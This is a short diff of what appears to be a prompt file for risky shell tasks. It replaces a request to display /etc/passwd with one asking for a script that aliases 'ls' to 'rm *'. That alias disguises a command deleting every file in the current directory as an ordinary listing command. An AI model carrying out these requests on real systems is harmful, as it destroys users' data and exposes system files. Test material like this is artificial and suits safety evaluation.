@@ -1,1 +1,7 @@
-Display the content of the /etc/passwd file.
+Create a script that creates an alias.
+
+
+
+Name: ls
+
+Value: rm *
